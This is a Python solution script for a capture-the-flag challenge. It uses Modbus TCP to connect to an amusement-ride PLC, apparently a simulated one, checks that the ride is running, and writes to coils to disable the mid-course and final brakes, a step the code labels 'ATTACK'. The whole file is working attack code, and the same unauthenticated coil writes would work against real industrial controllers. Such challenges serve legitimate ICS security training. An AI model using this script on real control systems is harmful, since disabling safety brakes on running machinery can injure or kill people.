#!/usr/bin/env python3
"""
CTF Challenge 7: Event Disable
Difficulty: Medium
Points: 200

Objective: Disable specific ride events while the ride is running to skip attractions.

Solution:
- Events can be controlled individually via coils 8-16
- Disable one or more events while the ride is in RUNNING state
- Hold the disabled state for verification
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_07_event_disable.py <PLC_IP> [PORT]")
        print("Example: python3 challenge_07_event_disable.py 134.199.202.235 502")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 7: Event Disable")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)

    if not client.connect():
        print("[!] Failed to connect to PLC")
        sys.exit(1)

    print("[+] Connected successfully")

    # Check if ride is running
    print("[*] Checking ride state...")
    state_result = client.read_holding_registers(1039, 1)  # MW15 = state
    if state_result.isError():
        print("[!] Failed to read state")
        client.close()
        sys.exit(1)

    current_state = state_result.registers[0]
    print(f"[*] Current state: {current_state} (0=IDLE, 1=STARTING, 2=RUNNING)")

    if current_state != 2:
        print("[!] Ride must be RUNNING (state=2) for this challenge")
        print("[!] Start the ride first using the HMI")
        client.close()
        sys.exit(1)

    # Read current event states
    print("[*] Reading current event enable states...")
    events_result = client.read_coils(8, 9)  # Events 1-9 (coils 8-16)
    if not events_result.isError():
        print("[*] Current event states:")
        for i, status in enumerate(events_result.bits[:9], 1):
            print(f"    Event {i}: {'ENABLED' if status else 'DISABLED'}")

    # ATTACK: Disable Event 5 (Mid-Course Brake) and Event 7 (Final Brake)
    print("\n[*] Executing attack: Disabling Event 5 (Mid-Course Brake)...")
    result1 = client.write_coil(12, False)  # event_5_enable

    if result1.isError():
        print("[!] Failed to disable Event 5")
        client.close()
        sys.exit(1)

    print("[+] Event 5 disabled successfully!")

    print("[*] Disabling Event 7 (Final Brake)...")
    result2 = client.write_coil(14, False)  # event_7_enable

    if result2.isError():
        print("[!] Failed to disable Event 7")
        client.close()
        sys.exit(1)

    print("[+] Event 7 disabled successfully!")
    print("[*] Holding for 3 seconds to verify...")

    # Hold for 3 seconds
    for i in range(3):
        time.sleep(1)
        # Verify states
        verify = client.read_coils(8, 9)
        if not verify.isError():
            event5 = "DISABLED" if not verify.bits[4] else "ENABLED"
            event7 = "DISABLED" if not verify.bits[6] else "ENABLED"
            print(f"[*] Event 5: {event5}, Event 7: {event7}")

    # Verify challenge completion by checking the ride is still running with events disabled
    state_check = client.read_holding_registers(1039, 1)
    if not state_check.isError() and state_check.registers[0] == 2:
        print("\n[+] Challenge condition met!")
        print("[*] Ride is running with disabled events")
        print("[*] Check the web interface for flag capture notification")
    else:
        print("\n[!] Challenge incomplete - ride stopped")

    client.close()

if __name__ == "__main__":
    main()
